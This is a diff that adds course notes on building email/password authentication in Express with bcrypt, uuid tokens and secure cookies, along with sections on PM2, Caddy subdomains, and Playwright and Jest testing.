@@ -6170,4 +6170,1662 @@ beds: 1
 }
 ```
 
+## Authorization services
+If your application is going to remember a user's data then it will need a way to uniquely associate the data with a particular credential. That usually means that you authenticate a user by asking for information, such as an email address and password. You then remember, for some period of time, that the user has authenticated by storing an authentication token on the user's device. Often that token is stored in a cookie that is passed back to your web service on each request. The service can now associate data that the user supplies with a unique identifier that corresponds to their authorization token.
 
+authentication
+
+Determining what a user is authorized to do in your application is also important. For example, you might have different roles in your application such as Administrators, Editors, and Customers. Once you have the ability to authenticate a user and store information about that user, you can also store the authorization for the user. A simple application might have a single field that represents the role of the user. The service code would then use that role to allow, limit, or prevent what a service endpoint does. A complex web application will usually have very powerful authorization representation that controls the user's access to every part of the application. For example, an Editor role might have authorization only to work on content that they created or were invited to.
+
+authorize
+
+As you might imagine, authentication and authorization can become very complex, very quickly. It is also a primary target for a hacker. If they can bypass the authentication or escalate what they are authorized to do, then they can gain control of your application. Additionally, constantly forcing users to authenticate in a secure way causes users to not want to use an application. This creates opposing priorities: keep the system secure or make it easy to use.
+
+In an attempt to remove the complexity of authentication and authorization from your application, many service providers and package developers have created solutions that you can use. Assuming that you are using a trusted, well-tested service this is an attractive option because it removes the cost of building, testing, and managing that critical infrastructure yourself.
+
+Authorization services often use standard protocols for authenticating and authorizing. These include standards such as OAuth, SAML, and OIDC. Additionally, they usually support concepts like Single Sign On (SSO) and Federated Login. Single sign on allows a user to use the same credentials for multiple web applications. For example, you can log in to GitHub using your Google credentials. Federated login allows a user to log in once, and then the authentication token is reused to automatically log the user in to multiple websites. For example, logging in to Gmail allows you to also use Google Docs and YouTube without logging in again.
+
+For this course we will implement our own authentication using a simple email/password design. Knowing how to implement a simple authentication design will help you appreciate what authentication services provide. If you want to experiment with different authorization services you might consider AWS Cognito, or Google Firebase.
+
+## Account creation and login
+
+The first step towards supporting authentication in your web application is providing a way for users to uniquely identify themselves. This usually requires two service endpoints. One to initially create an authentication credential, and a second to authenticate, or login, on future visits. Once a user is authenticated we can control access to other endpoints. For example, web services often have a getMe endpoint that gives information about the currently authenticated user. We will implement this endpoint to demonstrate that authentication is actually working correctly.
+
+Endpoint design
+Using HTTP we can map out the design of each of our endpoints.
+
+Create authentication endpoint
+This takes an email and password and returns a cookie containing the authentication token and user ID. If the email already exists it returns a 409 (conflict) status code.
+```js
+POST /auth/create HTTP/2
+Content-Type: application/json
+
+{
+  "email":"marta@id.com",
+  "password":"toomanysecrets"
+}
+HTTP/2 200 OK
+Content-Type: application/json
+Set-Cookie: auth=tokenHere
+
+{
+  "id":"337"
+}
+```
+Login authentication endpoint
+This takes an email and password and returns a cookie containing the authentication token and user ID. If the email does not exist or the password is bad it returns a 401 (unauthorized) status code.
+```js
+POST /auth/login HTTP/2
+Content-Type: application/json
+
+{
+  "email":"marta@id.com",
+  "password":"toomanysecrets"
+}
+HTTP/2 200 OK
+Content-Type: application/json
+Set-Cookie: auth=tokenHere
+
+{
+  "id":"337"
+}
+```
+GetMe endpoint
+This uses the authentication token stored in the cookie to look up and return information about the authenticated user. If the token or user do not exist it returns a 401 (unauthorized) status code.
+```js
+GET /user/me HTTP/2
+Cookie: auth=tokenHere
+HTTP/2 200 OK
+Content-Type: application/json
+
+{
+  "email":"marta@id.com"
+}
+```
+Web service
+With our service endpoints designed, we can now build our web service using Express.
+```js
+const express = require('express');
+const app = express();
+
+app.post('/auth/create', async (req, res) => {
+  res.send({ id: 'user@id.com' });
+});
+
+app.post('/auth/login', async (req, res) => {
+  res.send({ id: 'user@id.com' });
+});
+
+const port = 8080;
+app.listen(port, function () {
+  console.log(`Listening on port ${port}`);
+});
+```
+Follow these steps, and then add in the code from the sections that follow. There is a copy of the final version of the example at the end of this instruction. If you get lost, or things are not working as expected, refer to the final version.
+
+Create a directory called authTest that we will work in.
+
+Save the above content to a file named main.js. This is our starting web service.
+
+Run npm init -y to initialize the project to work with node.js.
+
+Run npm install express cookie-parser mongodb uuid bcrypt to install all of the packages we are going to use.
+
+Run node main.js or press F5 in VS Code to start up the web service.
+
+You can now open a console window and use curl to try out one of the endpoints.
+```js
+curl -X POST localhost:8080/auth/create
+{"id":"user@id.com"}
+```
+Handling requests
+With our basic service created, we can now implement the create authentication endpoint. The first step is to read the credentials from the body of the HTTP request. Since the body is designed to contain JSON we need to tell Express that it should parse HTTP requests, with a content type of application/json, automatically into a JavaScript object. We do this by using the express.json middleware. We can then read the email and password directly out of the req.body object. We can test that this is working by temporarily including them in the response.
+```js
+app.use(express.json());
+
+app.post('/auth/create', (req, res) => {
+  res.send({
+    id: 'user@id.com',
+    email: req.body.email,
+    password: req.body.password,
+  });
+});
+```
+```js
+curl -X POST localhost:8080/auth/create -H 'Content-Type:application/json' -d '{"email":"marta@id.com", "password":"toomanysecrets"}'
+{"id":"user@id.com","email":"marta@id.com","password":"toomanysecrets"}
+```
+Now that we have proven that we can parse the request bodies correctly, we can change the code to add a check to see if we already have a user with that email address. If we do, then we immediately return a 409 (conflict) status code. Otherwise we create a new user and return the user ID.
+```js
+app.post('/auth/create', async (req, res) => {
+  if (await getUser(req.body.email)) {
+    res.status(409).send({ msg: 'Existing user' });
+  } else {
+    const user = await createUser(req.body.email, req.body.password);
+    res.send({
+      id: user._id,
+    });
+  }
+});
+```
+Using the database
+We want to persistently store our users in Mongo and so we need to set up our code to connect to and use the database. This code is explained in the instruction on data services if you want to review what it is doing.
+```js
+const { MongoClient } = require('mongodb');
+
+const userName = 'holowaychuk';
+const password = 'express';
+const hostname = 'mongodb.com';
+
+const url = `mongodb+srv://${userName}:${password}@${hostname}`;
+
+const client = new MongoClient(url);
+With a Mongo collection object we can implement the getUser and createUser functions.
+
+function getUser(email) {
+  return collection.findOne({ email: email });
+}
+
+async function createUser(email, password) {
+  const user = {
+    email: email,
+    password: password,
+    token: 'xxx',
+  };
+  return collection.insertOne(user);
+}
+```
+But, we are missing a couple of things. We need a real authentication token, and we cannot simply store a clear text password in our database.
+
+Generating authentication tokens
+To generate a reasonable authentication token we use the uuid package. UUID stands for Universally Unique Identifier, and it does a really good job creating a hard to guess, random, unique ID.
+```js
+const uuid = require('uuid');
+
+token: uuid.v4();
+```
+Securing passwords
+Next we need to securely store our passwords. Failing to do so is a major security concern. If, and it has happened to many major companies, a hacker is able to access the database, they will have the passwords for all of your users. This may not seem like a big deal if your application is not very valuable, but users often reuse passwords. That means you will also provide the hacker with the means to attack the user on many other websites.
+
+So instead of storing the password directly, we want to cryptographically hash the password so that we never store the actual password. When we want to validate a password during login, we can hash the login password and compare it to our stored hash of the password.
+
+To hash our passwords we will use the bcrypt package. This creates a very secure one-way hash of the password. If you are interested in understanding how bcrypt works, it is definitely worth the time.
+```js
+const bcrypt = require('bcrypt');
+
+async function createUser(email, password) {
+  // Hash the password before we insert it into the database
+  const passwordHash = await bcrypt.hash(password, 10);
+
+  const user = {
+    email: email,
+    password: passwordHash,
+    token: uuid.v4(),
+  };
+  await collection.insertOne(user);
+
+  return user;
+}
+```
+Passing authentication tokens
+We now need to pass our generated authentication token to the browser when the login endpoint is called, and get it back on subsequent requests. To do this we use HTTP cookies. The cookie-parser package provides middleware for cookies and so we will leverage that.
+
+We import the cookieParser object and then tell our app to use it. When a user is successfully created, or logs in, we set the cookie header. Since we are storing an authentication token in the cookie, we want to make it as secure as possible, and so we use the httpOnly, secure, and sameSite options.
+
+httpOnly tells the browser to not allow JavaScript running on the browser to read the cookie.
+secure requires HTTPS to be used when sending the cookie back to the server.
+sameSite will only return the cookie to the domain that generated it.
+```js
+const cookieParser = require('cookie-parser');
+
+// Use the cookie parser middleware
+app.use(cookieParser());
+
+apiRouter.post('/auth/create', async (req, res) => {
+  if (await DB.getUser(req.body.email)) {
+    res.status(409).send({ msg: 'Existing user' });
+  } else {
+    const user = await DB.createUser(req.body.email, req.body.password);
+
+    // Set the cookie
+    setAuthCookie(res, user.token);
+
+    res.send({
+      id: user._id,
+    });
+  }
+});
+
+function setAuthCookie(res, authToken) {
+  res.cookie('token', authToken, {
+    secure: true,
+    httpOnly: true,
+    sameSite: 'strict',
+  });
+}
+```
+Login endpoint
+The login authorization endpoint needs to get the hashed password from the database, compare it to the provided password using bcrypt.compare, and if successful set the authentication token in the cookie. If the password does not match, or there is no user with the given email, the endpoint returns status 401 (unauthorized).
+```js
+app.post('/auth/login', async (req, res) => {
+  const user = await getUser(req.body.email);
+  if (user) {
+    if (await bcrypt.compare(req.body.password, user.password)) {
+      setAuthCookie(res, user.token);
+      res.send({ id: user._id });
+      return;
+    }
+  }
+  res.status(401).send({ msg: 'Unauthorized' });
+});
+```
+GetMe endpoint
+With everything in place to create credentials and login using the credentials, we can now implement the getMe endpoint to demonstrate that it all actually works. To implement this we get the user object from the database by querying on the authentication token. If there is not an authentication token, or there is no user with that token, we return status 401 (unauthorized).
+```js
+app.get('/user/me', async (req, res) => {
+  authToken = req.cookies['token'];
+  const user = await collection.findOne({ token: authToken });
+  if (user) {
+    res.send({ email: user.email });
+    return;
+  }
+  res.status(401).send({ msg: 'Unauthorized' });
+});
+Final code
+Here is the full example code.
+
+const { MongoClient } = require('mongodb');
+const uuid = require('uuid');
+const bcrypt = require('bcrypt');
+const cookieParser = require('cookie-parser');
+const express = require('express');
+const app = express();
+
+const userName = 'holowaychuk';
+const password = 'express';
+const hostname = 'mongodb.com';
+
+const url = `mongodb+srv://${userName}:${password}@${hostname}`;
+const client = new MongoClient(url);
+const collection = client.db('authTest').collection('user');
+
+app.use(cookieParser());
+app.use(express.json());
+
+// createAuthorization from the given credentials
+app.post('/auth/create', async (req, res) => {
+  if (await getUser(req.body.email)) {
+    res.status(409).send({ msg: 'Existing user' });
+  } else {
+    const user = await createUser(req.body.email, req.body.password);
+    setAuthCookie(res, user.token);
+    res.send({
+      id: user._id,
+    });
+  }
+});
+
+// loginAuthorization from the given credentials
+app.post('/auth/login', async (req, res) => {
+  const user = await getUser(req.body.email);
+  if (user) {
+    if (await bcrypt.compare(req.body.password, user.password)) {
+      setAuthCookie(res, user.token);
+      res.send({ id: user._id });
+      return;
+    }
+  }
+  res.status(401).send({ msg: 'Unauthorized' });
+});
+
+// getMe for the currently authenticated user
+app.get('/user/me', async (req, res) => {
+  authToken = req.cookies['token'];
+  const user = await collection.findOne({ token: authToken });
+  if (user) {
+    res.send({ email: user.email });
+    return;
+  }
+  res.status(401).send({ msg: 'Unauthorized' });
+});
+
+function getUser(email) {
+  return collection.findOne({ email: email });
+}
+
+async function createUser(email, password) {
+  const passwordHash = await bcrypt.hash(password, 10);
+  const user = {
+    email: email,
+    password: passwordHash,
+    token: uuid.v4(),
+  };
+  await collection.insertOne(user);
+
+  return user;
+}
+
+function setAuthCookie(res, authToken) {
+  res.cookie('token', authToken, {
+    secure: true,
+    httpOnly: true,
+    sameSite: 'strict',
+  });
+}
+
+const port = 8080;
+app.listen(port, function () {
+  console.log(`Listening on port ${port}`);
+});
+```
+Experiment
+With everything implemented we can use curl to try it out. First start up the web service from VS Code by pressing F5 and selecting node.js as the debugger if you have not already done that. You can set breakpoints on all of the different endpoints to see what they do and inspect the different variables. Then open a console window and run the following curl commands. You should see similar results as what is shown below. Note that the -c and -b parameters tell curl to store and use cookies with the given file.
+```js
+curl -X POST localhost:8080/auth/create -H 'Content-Type:application/json' -d '{"email":"지안@id.com", "password":"toomanysecrets"}'
+{"id":"639bb9d644416bf7278dde44"}
+curl -c cookie.txt -X POST localhost:8080/auth/login -H 'Content-Type:application/json' -d '{"email":"지안@id.com", "password":"toomanysecrets"}'
+{"id":"639bb9d644416bf7278dde44"}
+curl -b cookie.txt localhost:8080/user/me
+{"email":"지안@id.com"}
+```
+
+## Simon login
+Simon
+
+This deliverable demonstrates using MongoDB to persistently store application data, and authenticating users.
+
+You can view this application running here: Example Simon Login
+
+Simon Login
+
+Database support
+This version of Simon calls the database service to save high scores and authorization tokens. This creates a third layer in our Simon technology stack.
+
+Client application - Simple HTML/CSS/JavaScript
+Web service - Caddy, Node.js, Express
+Database service - MongoDB
+Connecting to the database
+We use a cloud service called MongoDB Atlas for our database service. Once we are connected to Atlas, we can make service calls to MongoDB from our web service. This involves specifying the database service endpoint and making database calls like the following.
+```js
+const { MongoClient } = require('mongodb');
+
+const url = `mongodb+srv://${userName}:${password}@${hostname}`;
+const client = new MongoClient(url);
+client.connect(err => {
+  const collection = client.db("test").collection("devices");
+
+  // ... perform actions on the DB collection
+
+  client.close();
+});
+```
+Create a MongoDB Atlas cluster
+You need to get a MongoDB Atlas account and create a database cluster that you can use as your database service. If you have not done that yet, go back and review the instruction on data services.
+
+Handling credentials
+Make sure you follow the instruction given previously about providing and protecting your MongoDB credentials in a file named dbConfig.json. This file will get deployed to production with the deployService.sh script.
+
+Working with the database
+The database.js file contains the functions for getting and adding high scores. The database functions are called from the getScores and submitScores endpoints found in index.js.
+
+Authorization
+Authorization UI
+The public/index.html, public/login.js, and public/login.css files provide all the login UI. Bootstrap provides the styling for the controls.
+
+When index.html is loaded, an anonymous function in login.js determines if the user is already authenticated and uses that state to hide or show the login controls.
+
+When a user logs in, logs out, or creates credentials the service endpoints are called.
+
+Authorization cookie
+The application service uses a secure cookie to store the authorization token for an authenticated user.
+```js
+function setAuthCookie(res, authToken) {
+  res.cookie(authCookieName, authToken, {
+    secure: true,
+    httpOnly: true,
+    sameSite: 'strict',
+  });
+}
+```
+Note the use of secure, httpOnly, and sameSite. Make sure you are familiar with what each of these mean.
+
+When a user is logged in, the cookie is added. When a user makes a secure request, the cookie is checked. When the user logs out, the cookie is removed.
+
+Application service endpoints
+The service endpoints are contained in index.js. The endpoints include authCreate, authLogin, authLogout, and userGet. These all work with the database to store and get credentials and update the authorization cookie.
+
+A new Express router, secureApiRouter wraps the existing router to add a middleware function that verifies that the authorization cookie is valid before passing the request to endpoints that require authorization. That makes it easy to create secure endpoints by just registering them with secureApiRouter.
+
+Study this code
+Get familiar with what this code teaches.
+
+Clone the repository to your development environment.
+
+git clone https://github.com/webprogramming260/simon-login.git
+Set up your Atlas credentials in a file named dbConfig.json that is in the same directory as database.js.
+
+Add dbConfig.json to your .gitignore file so that it doesn't put your credentials into GitHub accidentally.
+
+Review the code and get comfortable with everything it represents.
+
+Debug the code in your browser by hosting it from a VS Code debug session. This video on debugging a node.js based service will step you through the process.
+
+⚠ You will no longer use the live server extension to launch your frontend code in the browser since your frontend code will now be served up by the Node.js server you created in index.js. Set breakpoints in your backend code inside of Visual Studio.
+
+See how data is populated in the database by viewing the contents of the database using the MongoDB Atlas console.
+
+Make modifications to the code as desired. Experiment and see what happens.
+
+Deploy to production
+Deploy to your production environment using a copy of the deployService.sh script found in the example class application. Take some time to understand how it works.
+```js
+./deployService.sh -k <yourpemkey> -h <yourdomain> -s simon
+For example,
+
+./deployService.sh -k ~/keys/production.pem -h yourdomain.click -s simon
+Update your startup repository notes.md with what you learned.
+```
+
+Make sure your project is visible from your production environment (e.g. https://simon.yourdomain.click).
+
+
+## PM2
+
+When you run a program from the console, the program will automatically terminate when you close the console or if the computer restarts. In order to keep programs running after a shutdown you need to register it as a daemon. The term daemon comes from the idea of something that is always there working in the background. Hopefully you only have good daemons running in your background.
+
+We want our web services to continue running as a daemon. We would also like an easy way to start and stop our services. That is what Process Manager 2 (PM2) does.
+
+PM2 is already installed on your production server as part of the AWS AMI that you selected when you launched your server. Additionally, the deployment scripts found with the Simon projects automatically modify PM2 to register and restart your web services. That means you should not need to do anything with PM2. However, if you run into problems such as your services not running, then here are some commands that you might find useful.
+
+You can SSH into your server and see PM2 in action by running the following command.
+
+pm2 ls
+This should print out the two services, simon and startup, that are configured to run on your web server.
+
+You can try some of the other commands, but only if you understand what they are doing. Using them incorrectly could cause your web services to stop working.
+
+Command	Purpose
+```js
+pm2 ls	List all of the hosted node processes
+pm2 monit	Visual monitor
+pm2 start index.js -n simon	Add a new process with an explicit name
+pm2 start index.js -n startup -- 4000	Add a new process with an explicit name and port parameter
+pm2 stop simon	Stop a process
+pm2 restart simon	Restart a process
+pm2 delete simon	Delete a process from being hosted
+pm2 delete all	Delete all processes
+pm2 save	Save the current processes across reboot
+pm2 restart all	Reload all of the processes
+pm2 restart simon --update-env	Reload process and update the node version to the current environment definition
+pm2 update	Reload pm2
+pm2 start env.js --watch --ignore-watch="node_modules"	Automatically reload service when index.js changes
+pm2 describe simon	Describe detailed process information
+pm2 startup	Displays the command to run to keep PM2 running after a reboot.
+pm2 logs simon	Display process logs
+pm2 env 0	Display environment variables for process. Use pm2 ls to get the process ID
+```
+Registering a new web service
+If you want to setup another subdomain that accesses a different web service on your web server, you need to follow these steps.
+
+Add the rule to the Caddyfile to tell it how to direct requests for the domain.
+Create a directory and add the files for the web service.
+Configure PM2 to host the web service.
+Modify Caddyfile
+SSH into your server.
+
+Copy the section for the startup subdomain and alter it so that it represents the desired subdomain and give it a different port number that is not currently used on your server. For example:
+```js
+tacos.cs260.click {
+  reverse_proxy _ localhost:5000
+  header Cache-Control none
+  header -server
+  header Access-Control-Allow-Origin *
+}
+```
+This tells Caddy that when it gets a request for tacos.cs260.click it will act as a proxy for those requests and pass them on to the web service that is listening on the same machine (localhost), on port 5000. The other settings tell Caddy to return headers that disable caching, hide the fact that Caddy is the server (no reason to tell hackers anything about your server), and to allow any other origin server to make endpoint requests to this subdomain (basically disabling CORS). Depending on what your web service does you may want different settings.
+
+Restart Caddy to cause it to load the new settings.
+
+sudo service caddy restart
+Now Caddy will attempt to proxy the requests, but there is no web service listening on port 5000 and so you will get an error from Caddy if you make a request to tacos.cs260.click.
+
+Create the web service
+Copy the ~/services/startup directory to a directory that represents the purpose of your service. For example:
+```js
+cp -r ~/services/startup ~/services/tacos
+```
+If you list the directory you should see an index.js file that is the main JavaScript file for your web service. It has the code to listen on the designated network port and respond to requests. The following is the JavaScript that causes the web service to listen on a port that is provided as an argument to the command line.
+```js
+const port = process.argv.length > 2 ? process.argv[2] : 3000;
+app.listen(port, () => {
+  console.log(`Listening on port ${port}`);
+});
+```
+There is also a directory named public that has static HTML/CSS/JavaScript files that your web service will respond with when requested. The index.js file enables this with the following code:
+```js
+app.use(express.static('public'));
+You can start up the web service, listening on port 5000, using Node as follows.
+
+node index.js 5000
+```
+You can now access your web service through the browser, or curl.
+```js
+curl https://tacos.cs260.click
+```
+Caddy will receive the request and map the subdomain name, tacos.cs260.click, to a request for http://localhost:5000. Your web service is listening on port 5000 and so it receives the request and responds.
+
+Stop your web service by pressing CTRL-C in the SSH console that you used to start the service. Now your browser request for your subdomain should return an error again.
+
+Configure PM2 to host the web service
+The problem with running your web service from the console with node index.js 5000, is that as soon as you close your SSH session it will terminate all processes you started in that session, including your web service. Instead you need something that is always running in the background to run your web service. This is where daemons come into play. The daemon we use to do this is called PM2.
+
+From your SSH console session run:
+
+pm2 ls
+This will list the web services that you already have registered with PM2. To run your newly created web service under PM2, make sure you are in your service directory, and run the command similar to the following, with the service name and port substituted to your desired values:
+```js
+cd ~/services/tacos
+pm2 start index.js -n tacos -- 5000
+pm2 save
+```
+If you run pm2 ls again you should see your web service listed. You can now access your subdomain in the browser and see the proper response. PM2 will keep running your service even after you exit your SSH session.
+
+## UI testing
+
+Test driven development (TDD) is a proven methodology for accelerating application creation, protecting against regression bugs, and demonstrating correctness. TDD for console based applications and server based code is fairly straight forward. Web application UI code is significantly more complex to test, and using automated tests to drive your UI development is even more difficult.
+
+The problem is that a browser is required to execute UI code. That means you have to actually test the application in the browser. Additionally, every one of the major browsers behaves slightly differently, viewport size makes a big difference, all the code executes asynchronously, network disruptions are common, and then there is the human factor. A human will interact with the browser in very unexpected ways. Clicking where they shouldn't, clicking rapidly, randomly refreshing the browser, flushing cache, not flushing cache, leaving the application up for days on end, switching between tabs, opening the application multiple times, logging in on different tabs, logging out of one tab while still using the application on another tab, or ... on and on. And we haven't even talked about running all the different browsers on all of the possible devices.
+
+Of course the alternative to not test your code doesn't work either. That only means that you have to manually test everything every time you make any change, or you let your users test everything. That is not a good recipe for long term success.
+
+Fortunately this is a problem that many strong players have been working on for decades now, and the solutions, while not perfect, are getting better and better. We will look at two of these solutions. One is for executing automated tests in the browser, and the other is for testing on different browsers and devices.
+
+Automating the browser - Playwright
+📖 Deeper dive reading: Playwright and VS Code
+
+No one understands the difficulty of testing applications in a browser better than the companies that build web browsers. They have to test every possible use of HTML, CSS, and JavaScript that a user could think of. There is no way that manual testing is going to work and so early on they started putting hooks into their browsers that allowed them to be driven from automated external processes. Selenium was introduced in 2004 as the first popular tool to automate the browser. However, Selenium is generally considered to be flaky and slow. Flakiness means that a test fails in unpredictable, unreproducible ways. When you need thousands of tests to pass before you can deploy a new feature, even a little flakiness becomes a big problem. If those tests take hours to run then you have an even bigger problem.
+
+The market now has lots of alternatives when considering which automated browser framework to use. State of JS includes statistics on how popular these frameworks are. With frameworks coming and going all of the time, one telling statistic is the frameworks' ability to retain users.
+
+State of JS testing
+
+— Retention of browser based testing frameworks (Source: 2021.stateofjs.com)
+
+For the purposes of this instruction, we could pick any of the top contenders. However, we are going to pick a newcomer, Playwright. Playwright has some major advantages. It is backed by Microsoft, it integrates really well with VS Code, and it runs as a Node.js process. It is also considered one of the least flaky of the testing frameworks.
+
+As a demonstration of using Playwright, consider the following simplified HTML file containing a button that changes the paragraph text. The button calls a JavaScript function defined in a script element located in the HTML file.
+```html
+<body>
+  <p id="welcome" data-testid="msg">Hello world</p>
+  <button onclick="changeWelcome()">change welcome</button>
+  <script>
+    function changeWelcome() {
+      const welcomeEl = document.querySelector('#welcome');
+      welcomeEl.textContent = 'I feel welcomed';
+    }
+  </script>
+</body>
+```
+First, you need to install Playwright. In your project directory, use NPM to download the Playwright packages, install the browser drivers, configure your project, and create a couple example test files.
+
+npm init playwright@latest
+Next, you want to install the Playwright extension for VS Code. Go to the extensions tab in VS Code and search for, and install, Playwright Test for VSCode.
+
+You can now write your first Playwright test. Take the following and paste it over the tests/example.spec.js file that the Playwright install created.
+```js
+import { test, expect } from '@playwright/test';
+
+test('testWelcomeButton', async ({ page }) => {
+  // Navigate to the welcome page
+  await page.goto('http://localhost:5500/');
+
+  // Get the target element and make sure it is in the correct starting state
+  const hello = page.getByTestId('msg');
+  await expect(hello).toHaveText('Hello world');
+
+  // Press the button
+  const changeBtn = page.getByRole('button', { name: 'change welcome' });
+  await changeBtn.click();
+
+  // Expect that the change happened correctly
+  await expect(hello).toHaveText('I feel not welcomed');
+});
+```js
+This test makes sure you can successfully navigate to the desired page, that the page contains the desired elements, that you can press the button and the text changes as expected.
+
+Before you run the test, you actually need your application running for the test to execute against. You can do this by using the VS Code Live Server extension, or if you are testing a Node.js based service then run npm run start. You can actually add configuration to your tests so that your application is started when your tests run, but for now, just start up your application before you run the test.
+
+To run the test in VS Code, select the Test Explorer tab. You should see your test listed in the explorer. Select the example.spec.ts test and press the play button. This will start the test, launch a browser, run the test code to interact with the browser, and display the result. In this case our test fails because it is expecting the resulting text to be I feel not welcomed when it actually displays I feel welcomed.
+
+The following image should be similar to what you see. You can see the listing of tests on the left and the JavaScript based test in the editor window on the right. When a test fails, the editor window displays a clear description of what went wrong. You can even debug the tests as they execute just like you would any other Node.js based JavaScript execution.
+
+Playwright
+
+You can fix the test by either changing index.html or test/example.spec.js so that the text matches. Once you have done that you can run the test again and the test explorer should display a green check box.
+
+This is just a simple example of the powerful functionality of Playwright. You are encouraged to explore its functionality and even add some tests to your projects. Once you have gained some competency with Playwright you will find that you can write your code faster and feel more confident when changing things around.
+
+Testing various devices - BrowserStack
+With the ability to run automated UI tests, we now turn our attention to testing on the multitude of various devices. There are several services out there that help with this. One of these is BrowserStack. BrowserStack lets you pick from a long list of physical devices that you can run interactively, or use when driving automated tests with Selenium. The image below only shows a partial list of iPhone devices. BrowserStack also has devices for Android, Mac, and Windows.
+
+BrowserStack devices
+
+When you launch a device it connects the browser interface to a physical device hosted in a data center. You can then use the device to reproduce user reported problems, or validate that your implementation works on that specific device. The following image shows the use of BrowserStack to experiment with an iPhone 14 running iOS 16.
+
+BrowserStack iPhone
+
+BrowserStack offers free trials if you would like to see how your startup application works on a specific device.
+
+## Endpoint testing
+Using test driven development (TDD) for testing service endpoints is a common industry practice. Testing services is usually easier than writing UI tests because it does not require a browser. However, it does still take effort to learn how to write tests that are effective and efficient. Making this a standard part of your development process will give you a significant advantage as you progress in your professional career.
+
+As demonstrated by the following State of JS survey, there are lots of good testing packages that work well with Express driven services. We are going to look at the current champion Jest.
+
+State of JS Testing
+
+To get started with Jest we need a simple web service. In a console window, create a test directory, install Express, and open up VS Code.
+```js
+mkdir testJest
+cd testJest
+npm init -y
+npm install express
+code .
+```
+Now create a file named server.js and use Express to create an application with two endpoints: one to get a store (getStore), and another to update a store.
+```js
+server.js
+
+const express = require('express');
+const app = express();
+
+app.use(express.json());
+
+// Endpoints
+app.get('/store/:storeName', (req, res) => {
+  res.send({ name: req.params.storeName });
+});
+
+app.put('/store/:storeName', (req, res) => {
+  req.body.updated = true;
+  res.send(req.body);
+});
+```
+module.exports = app;
+In order to allow Jest to start up the HTTP server when running tests, we initialize the application a little bit differently than we have in the past. Normally, we would have just started listening on the Express app object after we defined our endpoints. Instead we export the Express app object from our server.js file and then import the app object in the index.js file that is used to run our service.
+```js
+index.js
+
+const app = require('./server');
+
+const port = 8080;
+app.listen(port, function () {
+  console.log(`Listening on port ${port}`);
+});
+```
+Breaking apart the definition of the service from the starting of the service allows us to start the service both when we run normally and also when using our testing framework.
+
+Jest endpoint requests
+
+You can test that the service is working properly by running the service in the VS Code debugger and pressing F5 while viewing the index.js file. Then open a browser and navigate to http://localhost:8080/store/provo. Stop the debugging session once you have demonstrated that the service is working correctly.
+
+To launch the service using Jest we create another file that has a suffix of .test.js. Any file with that suffix is considered a testing file and will automatically be discovered by Jest and examined for tests to run.
+
+A simple test
+Before we write tests for our endpoints we will write a simple test that demonstrates how Jest works. A test is created by calling the Jest test function. Note that you don't need to include a require statement to import Jest functions into your code. Jest will automatically import itself when it discovers a test file.
+
+Let's make our first test by creating a file named store.test.js and pasting in the following code.
+```js
+store.test.js
+
+test('that equal values are equal', () => {
+  expect(false).toBe(true);
+});
+```
+The test function takes a description as the first parameter. The description is meant to be human readable. In this case it reads: "test that equal values are equal". The second parameter is the function to call. Our function just calls the Jest expect function and chains it to the toBe function. You can read this as "expect false to be true", which of course is not true, but we want to see our test fail the first time we run it. We will fix this later so that we can show what happens when a test succeeds.
+
+In order to run the test we need to install the Jest package using NPM. From the console install the package. The -D parameter tells NPM to install Jest as a development package. That keeps it from being included when we do production release builds.
+
+npm install jest -D
+Now, replace the scripts section of the package.json file with a new command that will run our tests with Jest.
+```js
+"scripts": {
+  "test": "jest"
+}
+```
+With that in place we can run the test command and our test will execute. Notice that Jest shows exactly where the test failed and what expected values were not received.
+```js
+➜ npm run test
+
+ FAIL  ./store.test.js
+  ✕ that unequal values are not equal (1 ms)
+
+  ● that unequal values are not equal
+
+    expect(received).toBe(expected) // Object.is equality
+
+    Expected: true
+    Received: false
+
+      3 |
+      4 | test('that unequal values are not equal', () => {
+    > 5 |   expect(false).toBe(true);
+        |                 ^
+      6 | });
+      7 |
+      8 | // describe('endpoints', () => {
+
+      at Object.toBe (store.test.js:5:17)
+
+Tests:       1 failed, 1 total
+```
+We can then fix our test by rewriting it so that the expected value matches the provided value.
+```js
+store.test.js
+
+test('that equal values are equal', () => {
+  expect(true).toBe(true);
+});
+This time when we run the test it passes.
+
+➜  npm run test
+
+ PASS  ./store.test.js
+  ✓ that equal values are equal (1 ms)
+
+Tests:       1 passed, 1 total
+```
+Note that this example didn't actually test any of our code, but it does demonstrate how easy it is to write tests. A real test function would call code in your program. Let's do this by actually making calls to our endpoints.
+
+Testing endpoints
+To test our endpoints we need another package so that we can make HTTP requests without having to actually send them over the network. This is done with the NPM package called supertest. Go ahead and install this now.
+
+npm install supertest -D
+We can then alter store.test.js to import our Express service and also the request function from supertest that we will use to make HTTP requests.
+
+To make an HTTP request you pass the Express app to the supertest request function and then chain on the HTTP verb function that you want to call, along with the endpoint path. You can then chain on as many expect functions as you would like. In the following example we will expect an HTTP status code of 200 (OK), and that the body of the response contains the object that we expect the endpoint to return.
+
+If something goes wrong, the end function will contain an error and we pass the error along to the done function. Otherwise we just call done without the error.
+```js
+store.test.js
+
+const request = require('supertest');
+const app = require('./server');
+
+test('getStore returns the desired store', (done) => {
+  request(app)
+    .get('/store/provo')
+    .expect(200)
+    .expect({ name: 'provo' })
+    .end((err) => (err ? done(err) : done()));
+});
+```
+When we run this test we see that it passes without error.
+```js
+➜  npm run test
+
+ PASS  ./store.test.js
+  ✓ getStore returns the desired store (16 ms)
+
+Test Suites: 1 passed, 1 total
+Tests:       1 passed, 1 total
+Snapshots:   0 total
+Time:        0.237 s, estimated 1 s
+```
+You can change the test to expect a status code of 500 (Server Error) if you want to see the test fail. You can also change the endpoint code to return a 201 status code (Created) and also see the test fail.
+
+Now we can add a test for the updateStore endpoint. To do this we can copy the getStore endpoint, change the description, change the HTTP function verb to put, and send the body of the put request using the chained send function.
+```js
+const request = require('supertest');
+const app = require('./server');
+
+test('updateStore saves the correct values', (done) => {
+  request(app)
+    .put('/store/provo')
+    .send({ items: ['fish', 'milk'] })
+    .expect(200)
+    .expect({ items: ['fish', 'milk'], updated: true })
+    .end((err) => (err ? done(err) : done()));
+});
+
+test('getStore returns the desired store', (done) => {
+  request(app)
+    .get('/store/provo')
+    .expect(200)
+    .expect({ name: 'provo' })
+    .end((err) => (err ? done(err) : done()));
+});
+```
